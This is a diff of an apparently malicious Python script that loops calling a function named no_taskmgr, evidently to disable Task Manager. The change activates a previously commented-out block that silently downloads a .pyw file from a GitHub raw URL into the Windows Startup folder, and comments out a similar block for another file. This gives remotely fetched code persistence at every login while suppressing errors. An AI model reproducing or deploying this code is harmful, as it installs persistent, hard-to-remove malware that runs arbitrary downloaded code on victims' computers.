@@ -29,23 +29,21 @@ while True:
 no_taskmgr()
 
 # Download new ric (TODO: comment out this later)
-
-ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric_download.pyw"
 """
+ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric_download.pyw"
+
 try:
     urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric_download.pyw", ricpath)
 except Exception:
     pass
 """
 
-"""
 ricpath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pastedl.pyw"
 
 try:
     urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/pastedl.pyw", ricpath)
 except Exception:
     pass
-"""
 
 # TODO: this is temporary
 """
